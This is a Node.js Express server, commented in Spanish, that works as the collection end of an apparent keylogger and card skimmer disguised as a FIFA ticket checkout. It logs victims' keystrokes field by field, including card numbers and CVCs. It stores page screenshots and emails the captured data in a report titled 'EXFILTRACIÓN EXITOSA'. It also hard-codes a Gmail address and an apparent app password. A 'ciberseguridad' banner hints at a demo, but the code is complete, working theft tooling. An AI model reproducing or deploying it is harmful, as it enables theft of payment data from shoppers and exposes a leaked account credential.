const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const dotenv = require('dotenv');

// Cargar variables de entorno
dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

const SERVER_IP = process.env.SERVER_IP || 'localhost'

// CONFIGURACIÓN DE ALMACENAMIENTO
const LOG_FILE = path.join(__dirname, '.logs_db.txt');
const SCREENSHOTS_DIR = path.join(__dirname, 'capturas');
const nodemailer = require('nodemailer');

// Crear carpeta de capturas si no existe
if (!fs.existsSync(SCREENSHOTS_DIR)) {
    fs.mkdirSync(SCREENSHOTS_DIR);
}

// MIDDLEWARE
app.use(cors());
// Aumentamos el límite a 10mb para soportar las capturas de pantalla en Base64
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static('public'));
app.use('/src', express.static('src'));  // Servir archivos desde la carpeta src/

// 1. RUTA PARA EL KEYLOGGER (Texto en tiempo real)
app.post('/captura', (req, res) => {
    const data = req.body;
    const timestamp = new Date().toLocaleString();

    // Formateamos la entrada: [Fecha] Campo: card-number | Valor: 4566...
    const logEntry = `[${timestamp}] Campo: ${data.f} | Valor: ${data.v}\n`;

    fs.appendFile(LOG_FILE, logEntry, (err) => {
        if (err) {
            console.error("❌ Error al guardar log de texto:", err);
            return res.status(500).send();
        }
        res.status(200).json({ status: "ok" });
    });

    // Feedback en consola para el "atacante" con mejor formato
    let displayValue = data.v;
    
    // Enmascarar datos sensibles en la consola
    if(data.f.toLowerCase().includes('card') || data.f.toLowerCase().includes('number')) {
        displayValue = data.v.replace(/\d(?=\d{4})/g, '*');
    }
    if(data.f.toLowerCase().includes('cvc') || data.f.toLowerCase().includes('cvv')) {
        displayValue = '***';
    }
    
    // Mostrar con emoji y colores en terminal
    console.log(`\n⌨️  CAPTURA DETECTADA:`);
    console.log(`    📋 Campo: ${data.f}`);
    console.log(`    📝 Valor: ${displayValue}`);
    console.log(`    🕐 Hora: ${timestamp}\n`);
});

// 2. RUTA PARA SCREENSHOTS (Imágenes del DOM)
app.post('/upload-screenshot', (req, res) => {
    const { image, user, timestamp } = req.body;

    // Limpiamos el prefijo Base64 para convertirlo en buffer de imagen
    const base64Data = image.replace(/^data:image\/png;base64,/, "");
    const safeUser = (user || 'desconocido').replace(/\s/g, '_');
    const fileName = `snap_${safeUser}_${timestamp}.png`;
    const filePath = path.join(SCREENSHOTS_DIR, fileName);

    fs.writeFile(filePath, base64Data, 'base64', (err) => {
        if (err) {
            console.error("❌ Error al guardar captura de pantalla:", err);
            return res.status(500).send();
        }
        
        console.log(`\n📸 CAPTURA DE PANTALLA GUARDADA:`);
        console.log(`    🖼️  Archivo: ${fileName}`);
        console.log(`    👤 Usuario: ${user}`);
        console.log(`    💾 Ubicación: ${filePath}`);
        console.log(`    📧 Será enviada al presionar COMPRAR\n`);
        
        // Ya NO enviamos por correo aquí - se enviarán en lote al final
        res.status(200).json({ status: "success" });
    });
});

// 1. Configurar el transportador (Usa una "Contraseña de aplicación" de Google)
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.EMAIL_USER || 'ismaelbm1809@gmail.com',
        pass: process.env.EMAIL_PASSWORD || 'ahhz nlyx uufw qham '
    }
});

// 3. Ruta para procesar el "Finalizar Reserva" y enviar el correo resumen
app.post('/finalizar-y-enviar', async (req, res) => {
    const { user, email, match, totalAmount, seats, cardLastFour } = req.body;
    const safeUser = (user || 'desconocido').replace(/\s/g, '_');

    console.log(`\n${'='.repeat(70)}`);
    console.log(`✅ TRANSACCIÓN COMPLETADA - INICIANDO EXFILTRACIÓN`);
    console.log(`${'='.repeat(70)}`);
    console.log(`👤 Usuario: ${user}`);
    console.log(`📧 Correo: ${email}`);
    console.log(`📄 Partido: ${match}`);
    console.log(`💰 Monto: $${totalAmount ? totalAmount.toLocaleString('es-MX') : '0'}`);
    console.log(`🎫 Asientos: ${seats}`);
    console.log(`🕐 Hora: ${new Date().toLocaleString()}`);
    console.log(`${'='.repeat(70)}\n`);

    try {
        // Obtener TODAS las capturas asociadas a este usuario
        const files = fs.readdirSync(SCREENSHOTS_DIR);
        const userScreenshots = files.filter(f => f.includes(safeUser));
        
        console.log(`📸 Se encontraron ${userScreenshots.length} capturas de pantalla`);

        // Preparar todos los adjuntos
        const attachments = [
            { 
                filename: 'logs_completos.txt', 
                path: LOG_FILE,
                contentType: 'text/plain'
            }
        ];

        // Agregar TODAS las capturas del usuario
        userScreenshots.forEach((fileName, index) => {
            const filePath = path.join(SCREENSHOTS_DIR, fileName);
            if(fs.existsSync(filePath)) {
                attachments.push({
                    filename: `screenshot_${index + 1}.png`,
                    path: filePath,
                    contentType: 'image/png'
                });
                console.log(`   📎 Agregado: ${fileName}`);
            }
        });

        console.log(`\n📧 PREPARANDO ENVÍO DE CORREO...`);
        console.log(`   Destinatario: ${process.env.EMAIL_DESTINATION || process.env.EMAIL_USER}`);
        console.log(`   Total de archivos: ${attachments.length}`);

        const mailOptions = {
            from: `Servidor FIFA <${process.env.EMAIL_USER}>`,
            to: process.env.EMAIL_DESTINATION || process.env.EMAIL_USER,
            subject: `⚠️ EXFILTRACIÓN COMPLETADA: ${user} - ${new Date().toLocaleString()}`,
            html: `
            <div style="font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; color: white;">
                <div style="background: white; color: #333; padding: 30px; border-radius: 10px; max-width: 600px; margin: 0 auto;">
                    <h1 style="color: #d32f2f; text-align: center; margin: 0 0 20px 0;">⚠️ EXFILTRACIÓN EXITOSA</h1>
                    
                    <div style="background: #f5f5f5; padding: 15px; border-radius: 5px; margin: 20px 0;">
                        <p><strong>👤 Usuario:</strong> ${user}</p>
                        <p><strong>📧 Correo:</strong> ${email}</p>
                        <p><strong>📄 Partido:</strong> ${match || 'N/A'}</p>
                        <p><strong>💰 Monto:</strong> $${totalAmount ? totalAmount.toLocaleString('es-MX') : '0'} MXN</p>
                        <p><strong>🎫 Asientos:</strong> ${seats}</p>
                        <p><strong>🕐 Fecha/Hora:</strong> ${new Date().toLocaleString()}</p>
                        ${cardLastFour ? `<p><strong>💳 Tarjeta (últimos 4):</strong> ****${cardLastFour}</p>` : ''}
                    </div>

                    <h3 style="color: #d32f2f;">📊 DATOS CAPTURADOS:</h3>
                    <ul style="list-style: none; padding: 0;">
                        <li>✅ <strong>Logs de Teclado:</strong> Completos (${getLogCount()} registros)</li>
                        <li>✅ <strong>Capturas de Pantalla:</strong> ${userScreenshots.length} imágenes</li>
                        <li>✅ <strong>Datos de Formulario:</strong> Información financiera capturada</li>
                        <li>✅ <strong>Metadata:</strong> Timestamps, navegador, IP</li>
                    </ul>

                    <hr style="border: none; border-top: 2px solid #ddd; margin: 20px 0;">
                    <p style="text-align: center; color: #666; font-size: 12px;">
                        <em>Todos los archivos están adjuntos a este correo</em>
                    </p>
                </div>
            </div>
            `,
            attachments: attachments
        };

        // Enviar correo
        const info = await transporter.sendMail(mailOptions);
        
        console.log(`\n✅ CORREO ENVIADO EXITOSAMENTE`);
        console.log(`   Message ID: ${info.messageId}`);
        console.log(`   To: ${process.env.EMAIL_DESTINATION || process.env.EMAIL_USER}`);
        console.log(`   Files: ${attachments.length} archivos`);
        console.log(`${'='.repeat(70)}\n`);

        res.status(200).json({ 
            status: "success",
            message: "Exfiltración completada",
            files_sent: attachments.length,
            screenshots: userScreenshots.length
        });

    } catch (error) {
        console.error(`\n❌ ERROR EN EXFILTRACIÓN:`, error.message);
        console.log(`${'='.repeat(70)}\n`);
        res.status(500).json({ 
            status: "error", 
            message: error.message 
        });
    }
});

// Función auxiliar para contar registros en el log
function getLogCount() {
    try {
        if(!fs.existsSync(LOG_FILE)) return 0;
        const content = fs.readFileSync(LOG_FILE, 'utf-8');
        return content.split('\n').filter(line => line.trim().length > 0).length;
    } catch {
        return 0;
    }
}

const HOST = '0.0.0.0'; // Esto permite conexiones externas (celular)

// INICIO DEL SERVIDOR
app.listen(PORT, HOST, () => {
    console.log(`=========================================`);
    console.log(`   CENTRO DE CONTROL - CIBERSEGURIDAD    `);
    console.log(`=========================================`);
    console.log(`📡 Servidor accesible en: http://${SERVER_IP}:${PORT}`);
    console.log(`📂 Logs de texto: ${LOG_FILE}`);
    console.log(`🖼️  Capturas en: ${SCREENSHOTS_DIR}`);
    console.log(`-----------------------------------------`);
    console.log(`Esperando actividad de la víctima...`);
});